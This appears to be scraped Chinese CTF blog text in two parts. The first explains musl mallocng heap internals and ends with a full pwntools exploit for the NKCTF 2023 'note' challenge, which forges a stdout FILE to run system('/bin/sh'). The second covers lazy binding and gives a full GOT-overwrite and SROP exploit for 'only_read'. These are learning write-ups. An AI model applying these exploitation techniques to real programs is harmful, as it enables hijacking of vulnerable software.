同一类大小的chunk都会被分配到同一个group中 并且group实际上就是这些chunk内存的总和 例如下面这两个chunk group头就是0xc20和0xc28这0x10大小 红框部分存放的是meta的地址 蓝框部分则是active_idx 表示当前group能存放多少chunk 例如此时是0xe 那么就相当于[0,e]也就是0xf个 接着来看一下meta结构体 struct meta &#123; struct meta *prev, *next;//双向链表 struct group *mem;// 这里指向管理的group 地址 volatile int avail_mask, freed_mask; uintptr_t last_idx:5; uintptr_t freeable:1; uintptr_t sizeclass:6; uintptr_t maplen:8*sizeof(uintptr_t)-12;&#125;; prev和next是双向链表指针 这里只有这一个meta 就指向其自身 mem则是存放该mata管理的group地址 avail_mask需要转化成二进制形式 32764 = 110010011101100100 0表示不可分配 1表示可分配 顺序是从右往左 freed_mask同样需要转化为二进制形式 并且顺序同上 这里为0也就说明group中没有chunk被释放 last_idx表示最多可用的堆块数量 由于是[0,last_idx]所以这里还要加上1 实际上是15 free_able 代表当前meta是否可以被回收 1为可 0为不可 sizeclass则是表示由什么级别的group来管理这些chunk 你可以把其理解为原本glibc中不同size的链表 const uint16_t size_classes[] = &#123; 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 15, 18, 20, 25, 31, 36, 42, 50, 63, 72, 84, 102, 127, 146, 170, 204, 255, 292, 340, 409, 511, 584, 682, 818, 1023, 1169, 1364, 1637, 2047, 2340, 2730, 3276, 4095, 4680, 5460, 6552, 8191,&#125;; maplen &gt;&#x3D; 1表示这个meta里的group 是新mmap出来的,长度为多少 maplen &#x3D;0 表示group 不是新mmap 出来的在size_classes里 也有一个专门管理各个meta的结构体 struct meta_area &#123; uint64_t check; struct meta_area *next; int nslots; struct meta slots[];&#125;; meta_area的地址计算方式如下 meta_area_addr = meta &amp; ( -4096 ) check是一串随机生成的数字 用来防止伪造 next是下一个meta_arena的地址 没有则为0 nslots为槽的数量 最后来看一个综合的大结构体 __malloc_context struct malloc_context &#123; uint64_t secret;// 和meta_area 头的check 是同一个值 就是校验值#ifndef PAGESIZE size_t pagesize;#endif int init_done;//是否初始化标记 unsigned mmap_counter;// 记录有多少mmap 的内存的数量 struct meta *free_meta_head;// 被free 的meta 头 这里meta 管理使用了队列和双向循环链表 struct meta *avail_meta;//指向可用meta数组 size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift; struct meta_area *meta_area_head, *meta_area_tail; unsigned char *avail_meta_areas; struct meta *active[48];// 记录着可用的meta size_t u sage_by_class[48]; uint8_t unmap_seq[32], bounces[32]; uint8_t seq; uintptr_t brk;&#125;; 接下来的malloc和free源码分析我也是照着看雪的一篇文章学习的 讲的已经很详细了 文章链接贴在这里 我也会复制粘贴进来 方便我自己到时复现 https://bbs.kanxue.com/thread-269533-1.html malloc void *malloc(size_t n)&#123; if (size_overflows(n)) return 0;// 最大申请空间限制 struct meta *g; uint32_t mask, first; int sc; int idx; int ctr; if (n &gt;= MMAP_THRESHOLD) &#123;// size &gt;= 阈值 会直接通过mmap 申请空间 size_t needed = n + IB + UNIT; //UNIT 0x10 IB 4 定义在meta.h 里 这里UNIT + IB 是一个基本头的大小 void *p = mmap(0, needed, PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON, -1, 0);//新mmap group 空间 if (p==MAP_FAILED) return 0; wrlock(); step_seq(); g = alloc_meta(); if (!g) &#123; // 如果申请meta 失败 会把刚刚mmap 出来的group 回收 unlock(); munmap(p, needed);// 回收group return 0; &#125; g-&gt;mem = p;// mem = group 地址 g-&gt;mem-&gt;meta = g; //group 头部 指向meta (g 为 meta) g-&gt;last_idx = 0;//mmap的group last_idx默认值=0 g-&gt;freeable = 1; g-&gt;sizeclass = 63; // mmap 的申请的 sizeclass 都为63 g-&gt;maplen = (needed+4095)/4096; g-&gt;avail_mask = g-&gt;freed_mask = 0; ctx.mmap_counter++;// mmap 内存记载数量++ idx = 0; goto success; &#125; //否则直接根据传入size，转换成size_classes的对应大小的 下标， sc = size_to_class(n); rdlock(); g = ctx.active[sc]; // 从现有的active中取出对应sc 的 meta ,不同sc 对应不同的meta /* 如果从ctx.active 中没找到对应的meta 会执行下面的if分支 这里!g&lt;=&gt; g==0 ,说明ctx.active[sc] 没有对应的meta */ if (!g &amp;&amp; sc&gt;=4 &amp;&amp; sc&lt;32 &amp;&amp; sc!=6 &amp;&amp; !(sc&amp;1) &amp;&amp; !ctx.usage_by_class[sc]) &#123; size_t usage = ctx.usage_by_class[sc|1];// 如果在 ctx.active 没找到 就使用更大size group 的meta // if a new group may be allocated, count it toward // usage in deciding if we can use coarse class. if (!ctx.active[sc|1] || (!ctx.active[sc|1]-&gt;avail_mask &amp;&amp; !ctx.active[sc|1]-&gt;freed_mask)) usage += 3; if (usage &lt;= 12) sc |= 1; g = ctx.active[sc]; &#125; for (;;) &#123; mask = g ? g-&gt;avail_mask : 0; first = mask&amp;-mask; if (!first) break; if (RDLOCK_IS_EXCLUSIVE || !MT) g-&gt;avail_mask = mask-first; else if (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) continue; idx = a_ctz_32(first); goto success; &#125; upgradelock(); idx = alloc_slot(sc, n); /* 如果当前group 不满足就会来到这里: alloc_slot 从group 中取出对应大小chunk 的idx 这里先从对应sc 的ctx.active[sc] 中找对应的meta的group 有无空闲chunk可以使用 再从队列中其他meta的group 中找 如果队列中其他meta的group 有可利用的chunk,就使用 如果没有就重新分配一个新的group */ if (idx &lt; 0) &#123; unlock(); return 0; &#125; g = ctx.active[sc];// 取出 sc 对应active meta success: ctr = ctx.mmap_counter; unlock(); return enframe(g, idx, n, ctr);// 从对应meta 中的group 取出 第idx号chunk n = size&#125; chunk分配的主要逻辑是下面这个for循环 for (;;) &#123; mask = g ? g-&gt;avail_mask : 0; //先检查g所指meta是否存在，若存在mask = g-&gt;avail_mask first = mask&amp;-mask; //这里只有mask=0时，first才会为0 if (!first) break; //mask为0，first=0，无可用空闲chunk，跳出循环 if (RDLOCK_IS_EXCLUSIVE || !MT)//如果是排它锁, 那么下面保证成功 g-&gt;avail_mask = mask-first; else if (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) //成功找到并设置avail_mask之后,continue 后设置idx，然后跳出 continue; idx = a_ctz_32(first); goto success;&#125; upgradelock(); idx = alloc_slot(sc, n); 跟进一下索引idx的alloc_slot函数 static int alloc_slot(int sc, size_t req)&#123; // 尝试从限制active 中找到合适可用的 uint32_t first = try_avail(&amp;ctx.active[sc]); if (first) return a_ctz_32(first); // 如果没找到 重新创造一个meta，然后重新分配一个size大小对应sc的group，给这个新分配的meta struct meta *g = alloc_group(sc, req); if (!g) return -1; g-&gt;avail_mask--; queue(&amp;ctx.active[sc], g); //把新meta 加入队列 return 0;&#125; 跟进一下try_avail函数 static uint32_t try_avail(struct meta **pm)&#123; struct meta *m = *pm; uint32_t first; if (!m) return 0; uint32_t mask = m-&gt;avail_mask; if (!mask)//mask = m-&gt;avail_mask (!mask) 表示没有可用的chunk了 &#123; if (!m-&gt;freed_mask) // if (!m-&gt;freed_mask) &lt;=&gt; 没有已经释放的chunk &#123; /* 进入这个分支的条件:既没有可用的chunk，也没有被释放还未回收的chunk，即chunk都被使用，且都没被释放 */ dequeue(pm, m); // freed_mask==avail_mask=0, group 空间已满 让对应的meta 出队 m = *pm; if (!m) return 0; &#125; /* 这里else表示的是:无可用空闲chunk，但是有已经释放的chunk !!! free释放的chunk 不能马上被复用的 !!! */ else &#123; /* 进入这个分支的条件:没有可用的chunk，有被释放还未回收的chunk。 有点好奇这里，如果达成这个条件，然后利用指针互写，修改m-&gt;next 伪造的meta，是不是就可以制造fake meta 入队的假象 若meta链表中没有，一般meta 的next和prev 都是指向自己 */ m = m-&gt;next; *pm = m; &#125; mask = m-&gt;freed_mask; // 如果这个meta 的group 只含有一个chunk ，且被释放就跳过， // 或者 这个meta 的group 根本不能被释放 如mmap 的 group last_idx = 0 freeable=1 if (mask == (2u&lt;&lt;m-&gt;last_idx)-1 &amp;&amp; m-&gt;freeable) &#123; m = m-&gt;next; *pm = m; mask = m-&gt;freed_mask; &#125; // activate more slots in a not-fully-active group // if needed, but only as a last resort. prefer using // any other group with free slots. this avoids // touching &amp; dirtying as-yet-unused pages. if (!(mask &amp; ((2u&lt;&lt;m-&gt;mem-&gt;active_idx)-1))) &#123; if (m-&gt;next != m) &#123; // 如果这个meta 后还有meta 就切换到 下一个meta m = m-&gt;next; *pm = m; &#125; else &#123; int cnt = m-&gt;mem-&gt;active_idx + 2; int size = size_classes[m-&gt;sizeclass]*UNIT; int span = UNIT + size*cnt; // activate up to next 4k boundary while ((span^(span+size-1)) &lt; 4096) // 页对齐 &#123; cnt++; span += size; &#125; if (cnt &gt; m-&gt;last_idx+1) cnt = m-&gt;last_idx+1; m-&gt;mem-&gt;active_idx = cnt-1; &#125; &#125; mask = activate_group(m);// 这里是给 m的 avail_mask 打上标记 assert(mask); decay_bounces(m-&gt; sizeclass); &#125; first = mask&amp;-mask; // 若 mask%2==0 则first =结果是能整除这个偶数的最大的2的幂 若 mask%2==1 则first永远为1 m-&gt;avail_mask = mask-first; return first;&#125; 上述源码可以总结为下列流程 一、判断是否超过size 阈值先检查 申请的chunk的 needed size 是否超过最大申请限制检查申请的needed 是否超过需要mmap 的分配的阈值 超过就用mmap 分配一个group 来给chunk使用若是mmap 则设置各种标记二、分配chunk若申请的chunk 没超过阈值 就从active 队列找管理对应size大小的meta关于找对应size的meta 这里有两种情况:如果active 对应size的meta 位置上为空，没找到那么尝试先找size更大的meta如果active 对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk(这里malloc 那个循环:for (;;)，这里不清楚建议看malloc源码分析那里)如果通过循环里，通过meta-&gt;avail_mask 判断当前group 中是否有空闲chunk有，就直接修改meta-&gt;avail_mask，然后利用enframe(g, idx, n, ctr);// 从对应meta 中的group 取出 第idx号chunk分配无，break 跳出循环跳出循环后执行idx = alloc_slot(sc, n); alloc_slot有三种分配方式使用group中被free的chunk从队列中其他meta的group 中找如果都不行就重新分配一个新的group 对应一个新的metaenframe(g, idx, n, ctr) 取出 对应meta 中对应idx 的chunk 和glibc不同的是 musl中chunk有三种状态 从上面的源码也可以看出 是优先查找空闲的chunk 其次才是被释放的chunk 所以被释放的chunk不会立刻回收利用 接下来看一下free函数的源码 void free(void *p)&#123; if (!p) return; struct meta *g = get_meta(p);// 通过chunk p 用get_meta得到对应的meta int idx = get_slot_index(p);// 得到对应chunk的 idx size_t stride = get_stride(g); // 得到sizeclasses 中对应chunk类型的size unsigned char *start = g-&gt;mem-&gt;storage + stride*idx; unsigned char *end = start + stride - IB; //*start = g-&gt;mem-&gt;storage(得到group中第一个chunk地址) + stride*idx(加上对应chunk偏移); // start 就为对应p(chunk)的起始地址 // end 对应结束地址 get_nominal_size(p, end);//算出真实大小 uint32_t self = 1u&lt;&lt;idx, all = (2u&lt;&lt;g-&gt;last_idx)-1;//设置bitmap 标志 ((unsigned char *)p)[-3] = 255; *(uint16_t *)((char *)p-2) = 0; if (((uintptr_t)(start-1) ^ (uintptr_t)end) &gt;= 2*PGSZ &amp;&amp; g-&gt;last_idx) &#123; unsigned char *base = start + (-(uintptr_t)start &amp; (PGSZ-1)); size_t len = (end-base) &amp; -PGSZ; if (len) madvise(base, len, MADV_FREE); &#125; // atomic free without locking if this is neither first or last slot for (;;) &#123; uint32_t freed = g-&gt;freed_mask; uint32_t avail = g-&gt;avail_mask; uint32_t mask = freed | avail; // 将释放的chunk 和 现在可用的 chunk 加起来 assert(!(mask&amp;self)); if (!freed || mask+self==all) break; //!freed 没有被释放的chunk，mask+self==all说明释放了当前chunk所有chunk 都将被回收 // 此group 会被弹出队列 if (!MT) g-&gt;freed_mask = freed+self;// 设置free_mask 表示chunk 被释放 else if (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed) continue; return; &#125; wrlock(); struct mapinfo mi = nontrivial_free(g, idx);// 含有meta 操作 ，内有unlink 是漏洞利用的关键 unlock(); if (mi.len) munmap(mi.base, mi.len);&#125; 通过get_meta(p)得到meta (get_meta 是通过chunk 对应的offset 索引到对应的group 再索引到meta) 下面会详细介绍get_meta通过get_slot_index(p)得到对应chunk的 idx -&gt; 通过get_nominal_size(p, end) 算出真实大小重置idx 和 offset idx 被置为0xff 标记chunk修改freed_mask 标记chunk被释放最后调用nontrivial_free 完成关于meta一些剩余操作 (注意进入nontrivial_free 是在for循环外 还未设置)释放chunk的时候，先只会修改freed_mask,不会修改avail_mask，说明chunk 在释放后，不会立即被复用注意进入nontrivial_free 是在for循环外 还未设置freed_mask 跳出循环的条件是 if (!freed || mask+self==all) break;free 中chunk 的起始位置可以通过 chunk的idx 定位 static inline struct meta *get_meta(const unsigned char *p)&#123; assert(!((uintptr_t)p &amp; 15)); int offset = *(const uint16_t *)(p - 2);// 得到chunk offset int index = p[-3] &amp; 31;;// 得到chunk idx if (p[-4]) &#123; assert(!offset); offset = *(uint32_t *)(p - 8); assert(offset &gt; 0xffff); &#125; const struct group *base = (const void *)(p - UNIT*offset - UNIT);// 通过offset 和chunk 地址计算出group地址 const struct meta *meta = base-&gt;meta;// 从group 得到 meta 地址 assert(meta-&gt;mem == base);// 检查meta 是否指向对应的group assert(index &lt;= meta-&gt;last_idx);// 检查chunk idx 是否超过 meta 最大chunk 容量 assert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index))); assert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index))); const struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);// 得到meta_area 地址 assert(area-&gt;check == ctx.secret);// 检查 check 校验值 if (meta-&gt;sizeclass &lt; 48) &#123; // 如果属于 sizeclasses 管理的chunk 大小 assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index); assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)); &#125; else &#123; assert(meta-&gt;sizeclass == 63); &#125; if (meta-&gt;maplen) &#123; assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1); &#125; return (struct meta *)meta;&#125; static struct mapinfo nontrivial_free(struct meta *g, int i)// i = idx&#123; uint32_t self = 1u&lt;&lt;i; int sc = g-&gt;sizeclass; uint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;//mask=已经被free的chunk +可使用的chunk if (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)) &#123; /* 如果 mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 代表此meta中group里的chunk 都被释放 或者 都被用了 (2u&lt;&lt;g-&gt;last_idx)-1 计算出的值化成二进制，其中每位含义类似于bitmap，如果每位为1表每位要不是被free 不然就是被 okay_to_free 检测是否可以被释放 */ if (g-&gt;next) &#123; // 如果队列中 有下一个meta assert(sc &lt; 48);// 检测 sc 是不是mmap 分配的 // 检测当前meta g 和 队列里的active[sc] meta 是否一样，一样则activate_new赋值为1 int activate_new = (ctx.active[sc]==g); dequeue(&amp;ctx.active[sc], g);// 当前meta 出队 // 在出队操作后 ,ctx.active[sc]==meta -&gt;next 是指的刚刚出队meta 的下一个meta if (activate_new &amp;&amp; ctx.active[sc]) activate_group(ctx.active[sc]);//如果有下一个meta 直接激活 然后修改avail_mask 标志位 &#125; return free_group(g); &#125; else if (!mask) &#123;// mask==0 group chunk 空间已被完全使用 assert(sc &lt; 48); // might still be active if there were no allocations // after last available slot was taken. if (ctx.active[sc] != g) &#123;// 如果 g 未被加入 队列ctx.ative[sc] queue(&amp;ctx.active[sc], g);// 把g 加入队列 &#125; &#125; a_or(&amp;g-&gt;freed_mask, self);// 修改对应 的freed_mask 标志 ，表示着对应的chunk 已被释放 return (struct mapinfo)&#123; 0 &#125;;&#125; nontrivial_free函数中调用了一个关键的函数 dequeue static inline void dequeue(struct meta **phead, struct meta *m)&#123; if (m-&gt;next != m) &#123; m-&gt;prev-&gt;next = m-&gt;next; // 这里存在指针互写 在 prev 所指地址上 写入next 指针 m-&gt;next-&gt;prev = m-&gt;prev; // 在next 所指地址上 写入prev 指针 if (*phead == m) *phead = m-&gt;next;// 队列头如果为m 那就更新为m-&gt;next &#125; else &#123; *phead = 0; &#125; m-&gt;prev = m-&gt;next = 0; // 清理m(meta)的头尾指针&#125; 其原本的作用是prev和next指针互写 用于一个meta出队时 meta什么时候会出队 当其所有的chunk都被释放或者都处于空闲状态 就会出队 2023NKCTF note说那么多也无聊死了 直接上题目! 先来一题简单的 代码太长了就不放了 简单介绍一下 给了四个函数 add 可以申请任意大小的chunk edit 同时可以堆溢出 show 可以打印出chunk的地址 delete函数 置零了指针 不存在UAF 但是其对于index并没有检测 所以这个index实际上可以为任意数 我们可以对ptr数组附近的区域进行任意写 不过 首要的任务还是泄露libc基址 来看看musl的堆题要如何泄露libc基址 我们先申请一个0xc大小的chunk 然后再申请一个0x1c大小的chunk 你会发现第二个chunk竟然分配到的是libc地址上 这是因为在malloc第二个chunk的时候 如果没有找到合适的空闲chunk或者是被释放的chunk 就会分配一个新的group struct meta *g = alloc_group(sc, req); 而分配出来的这个group就位于libc地址上 相关的可以自己跟着源码动调看看(虽然我自己调了也还是不知道为啥有的分配到了堆地址 有的分配到了libc地址) 接下来再看题目 这里对于我们输入的v5没有进行任何的限制 也就是说我们可以输出ptr数组后的地址其指向的内容 此时chunk0和ptr数组相较来说比较接近 所以只要我们将chunk0的内容编辑成chunk1的meta chunk1的meta中有存储着chunk1的地址 这样就能泄露出libc地址了 那么首先就是要泄露出堆地址 计算一下chunk0和ptr数组的偏移 随后泄露出chunk0的meta地址 计算一下和chunk1的meta的偏移 随后将chunk1的meta地址存放到chunk0上 show泄露出libc地址 add(0,0xc,b&#x27;aaaa&#x27;)add(1,0x1c,b&#x27;aaaa&#x27;)show(0x570)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x2e8success(&quot;heap_addr :&quot;+hex(heap_addr))chunk1_addr = heap_addr+0x320edit(0,8,p64(chunk1_addr))show(0x572)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-(0x7fccb8f39d10-0x7fccb8e9e000)success(&quot;libc_addr :&quot;+hex(libc_addr))debug() 接下来难点在于说如何获取shell 在glibc中最常见的做法是覆盖hook函数 但是musl可没有这些东西 所以我们只能采用伪造io_file结构体 我们来看一下exit函数的调用链 _Noreturn void exit(int code)&#123; __funcs_on_exit(); __libc_exit_fini(); __stdio_exit(); _Exit(code);&#125; 跟进一下__stdio_exit函数 void __stdio_exit(void)&#123; FILE *f; for (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f); close_file(__stdin_used); close_file(__stdout_used); close_file(__stderr_used);&#125; 可以看到在最后利用close_file操作了三个file结构体 我们选择利用__stdout_used 先在gdb中查看一下其构成 static void close_file(FILE *f)&#123; if (!f) return; FFINALLOCK(f); if (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0); if (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);&#125; 当f-&gt;wpos !&#x3D; f-&gt;wbase成立时 就会调用f-&gt;write 并且将f起始的作为rdi寄存器 也就是说我们需要伪造_stout_file 并且有四个地方需要注意 也就是构造成下面这个样子 fake_stdout_file = &#x27;/bin/sh\\x00&#x27;.ljust(0x38,&#x27;\\x00&#x27;) + p64(1) + p64(0) + p64(system) 并且把可控地址写入到__stdout_used中 这里的可控地址当然是一个chunk了 不过经过我自己实验 musl中堆的分配好像和glibc不一样 所以这里的chunk必须和chunk1一样是在libc地址中的 这样才能保证偏移正确 完整exp: from pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;ctf.comentropy.cn&quot;,8301)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)libc = ELF(&quot;./libc.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./libc-2.32.so&quot;)#libc = ELF(&quot;./locate&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()def add(index,size,content): io.recvuntil(&quot;your choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content: &quot;) io.send(content)def edit(index,size,content): io.recvuntil(&quot;your choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content: &quot;) io.send(content)def delete(index): io.recvuntil(&quot;your choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;your choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))add(0,0xc,b&#x27;aaaa&#x27;)add(1,0x1c,b&#x27;aaaa&#x27;)show(0x570)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x2e8success(&quot;heap_addr :&quot;+hex(heap_addr))chunk1_addr = heap_addr+0x320edit(0,8,p64(chunk1_addr))show(0x572)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-(0x7fccb8f39d10-0x7fccb8e9e000)success(&quot;libc_addr :&quot;+hex(libc_addr))__stdout_used = libc_addr + libc.sym[&#x27;__stdout_used&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]fake_file = b&#x27;/bin/sh\\x00&#x27;.ljust(0x38,b&#x27;\\x00&#x27;)+p64(1)+p64(0)+p64(system_addr)add(2,0x500,fake_file)edit(0,8,p64(__stdout_used))fakechunk_addr = libc_addr + (0x7f081beb5020-0x7f081beb6000)success(&quot;fakechunk_addr :&quot;+hex(fakechunk_addr))edit(0x572,8,p64(fakechunk_addr))io.recvuntil(&quot;your choice: &quot;)io.sendline(b&#x27;5&#x27;)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"延迟绑定及利用","slug":"延迟绑定及利用","date":"2023-03-28T11:36:29.000Z","updated":"2023-09-14T17:18:30.000Z","comments":true,"path":"2023/03/28/延迟绑定及利用/","link":"","permalink":"http://example.com/2023/03/28/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%8F%8A%E5%88%A9%E7%94%A8/","excerpt":"","text":"前言通常来说 我们想要通过A函数来调用B函数 最常用的办法是覆盖函数A的got表 但是这种做法存在一种弊端 这里我们先不提及 在下面会逐渐揭示 我们先来了解一下函数的动态链接到底是怎么实现的 原理分析我们知道 对于一个c语言程序来说 其从.c文件编译成为一个可执行文件 一共需要四个步骤 分别是预处理 编译 汇编 链接 这里这把链接展开说 链接分为静态链接和动态链接 这里的静态动态是对于函数的调用来说的 静态链接出来的二进制文件通常是要大于动态链接的 是因为其包括了完整的静态库 而动态链接则是在程序运行时 再去通过操作系统自带的动态链接库索引 这种操作称之为延迟绑定 延迟绑定的实现主要是由plt表 got表 got.plt表这三个实现 全局偏移表是对got表和got.plt表的统称 其中got表存放供外部变量引用的地址 got.plt表则是延迟绑定利用的关键 存放外部函数引用的地址 got.plt表相当于一个数组 其固定拥有三个元素 从0到2分别占据数组 依次存放 dynamic段的地址 本模块的ID _dl_runtime_resolve函数的地址 dynamic段供动态链接器提取动调链接信息 ID则是用来索引不同的函数 dl_runtime_resolve负责解析出函数的真实地址 接下来看一下一个函数是如何进行延迟绑定 获取到真实地址的 对于一个函数来说 在其还没有被第一次调用前 其存储的是.plt表上的地址 以puts函数为例 这里的0x0就是其模块ID 随后跳转到0x401020上 在这里索引到全局偏移表中的GOT[1] 在这里压入模块ID 随后通过_dl_runtime_resolve函数获取到真实地址 随后根据模块ID 放入GOT数组中对应位置 实操演示上面说到过 通过覆盖got表来实现函数误导调用有一种弊端 就是在我们下面这种办法的利用中 必须选择延迟绑定的利用方法 跟着我来看一下吧 所选例题是NKCTF2023的only_read libc版本为2.31 9.9 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s1[64]; // [rsp+0h] [rbp-80h] BYREF char s[64]; // [rsp+40h] [rbp-40h] BYREF setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); memset(s, 0, sizeof(s)); memset(s1, 0, sizeof(s1)); read(0, s, 0x30uLL); base_decode(s, s1); if ( strcmp(s1, &quot;Welcome to NKCTF!&quot;) ) return 0; memset(s, 0, sizeof(s)); memset(s1, 0, sizeof(s1)); read(0, s, 0x30uLL); base_decode(s, s1); if ( strcmp(s1, &quot;tell you a secret:&quot;) ) return 0; memset(s, 0, sizeof(s)); memset(s1, 0, sizeof(s1)); read(0, s, 0x40uLL); base_decode(s, s1); if ( strcmp(s1, &quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9&quot;) ) return 0; memset(s, 0, sizeof(s)); memset(s1, 0, sizeof(s1)); read(0, s, 0x40uLL); base_decode(s, s1); if ( !strcmp(s1, &quot;can you find me?&quot;) ) next(); return 0;&#125; 为了不通过puts等输出函数来书写字符串 利用strcmp函数来对比base64加解密的字符串 这里就不解释了 来看一下next函数 ssize_t next()&#123; char buf[48]; // [rsp+0h] [rbp-30h] BYREF return read(0, buf, 0x200uLL);&#125; 很明显的栈溢出漏洞 但是难点在于说没有给任何的输出函数 也就是说没有办法泄露libc地址(实际上是可以的 覆盖got表爆破 但是这里不用这种办法) 这种情况极大程度上限制了我们的利用 不过还是可以通过Srop的方法来getshell 为了促成srop 我们就需要使得控制rax寄存器的值为15 随后syscall系统调用 但是这题没有直接给控制rax的指令 这个时候我们要联想到 大部分函数执行完都是有返回值的 而这个返回值就是用rax寄存器存储的 这里采用read函数来控制rax寄存器 那么syscall要如何解决呢 这题同样也是没有syscall函数的 不知道你有没有s进入read函数中看其是如何调用的 实际上read函数是通过syscall实现的 同时注意一下 syscall和read函数的起始地址 只差在倒数第二位 如果我们覆盖read函数的got表 执行read函数就相当于执行syscall 但是此时read函数也就相当于废掉了 相当于syscall了 我们还怎么利用read函数来控制rax寄存器呢 这个时候就用到延迟绑定了 我们直接把其他函数的got表改为read函数在plt表上的地址 这样就相当于再次延迟绑定一次 也就相当于调用了read函数 不过这样子会使得read函数的got表恢复为原来的值 需要我们重新留覆盖一下 from pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;ctf.comentropy.cn&quot;,8301)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./libc-2.32.so&quot;)#libc = ELF(&quot;./locate&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()io.send(b&quot;V2VsY29tZSB0byBOS0NURiE=&quot;)sleep(0.1)io.send(b&quot;dGVsbCB5b3UgYSBzZWNyZXQ6&quot;)sleep(0.1)io.send(b&quot;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45&quot;)sleep(0.1)io.send(b&quot;Y2FuIHlvdSBmaW5kIG1lPw==&quot;)rdi_addr = 0x0000000000401683rsi_r15_addr = 0x0000000000401681ret_addr = 0x000000000040101aleave_addr = 0x00000000004013c2next_addr = elf.sym[&#x27;next&#x27;]bss_addr = elf.bss(0x600)rsp_r13_r14_r15_addr = 0x000000000040167dpayload = cyclic(0x38)+p64(rdi_addr)+p64(0)payload += p64(rsi_r15_addr)+p64(elf.got[&#x27;memset&#x27;])+p64(0)+p64(elf.plt[&#x27;read&#x27;])payload += p64(rdi_addr)+p64(0)payload += p64(rsi_r15_addr)+p64(bss_addr)+p64(0)+p64(elf.plt[&#x27;memset&#x27;])payload += p64(rsp_r13_r14_r15_addr)+p64(bss_addr-0x10)# gdb.attach(io,&#x27;b *0x4013E8&#x27;)# pause(0)io.send(payload)sleep(0.1)payload = p64(0x401050)+b&#x27;\\xd0&#x27;# gdb.attach(io,&#x27;b *&#x27;+str(rsi_r15_addr))# pause(0)io.send(payload)sleep(0.1)frame = SigreturnFrame()frame.rax = 59frame.rsi = 0frame.rsi = 0frame.rdi = bss_addrframe.rip = elf.plt[&#x27;read&#x27;]payload = b&#x27;/bin/sh\\x00&#x27;+p64(rdi_addr)+p64(0)payload += p64(rsi_r15_addr)+p64(elf.got[&#x27;memset&#x27;]-0x6)+p64(0)+p64(elf.plt[&#x27;memset&#x27;])payload += p64(elf.plt[&#x27;read&#x27;])+bytes(frame)# gdb.attach(io,&#x27;b *&#x27;+str(rsp_r13_r14_r15_addr))# pause(0)io.send(payload)sleep(0.1)payload = cyclic(0x6)+p64(0x401050)+b&#x27;\\xd0&#x27;# gdb.attach(io,&#x27;b *&#x27;+str(elf.plt[&#x27;read&#x27;]))# pause(0)io.send(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: 